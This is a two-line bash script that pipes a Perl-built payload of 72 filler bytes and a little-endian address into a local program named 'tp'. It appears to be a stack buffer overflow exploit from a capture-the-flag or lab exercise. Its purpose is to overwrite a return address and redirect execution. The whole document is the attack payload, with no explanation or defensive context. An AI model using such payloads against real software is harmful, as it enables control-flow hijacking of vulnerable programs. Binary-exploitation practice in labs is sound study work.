#!/usr/bin/bash

perl -e 'print("X" x 72, "\xb6\x11\x40\x00\n")' | ./tp 
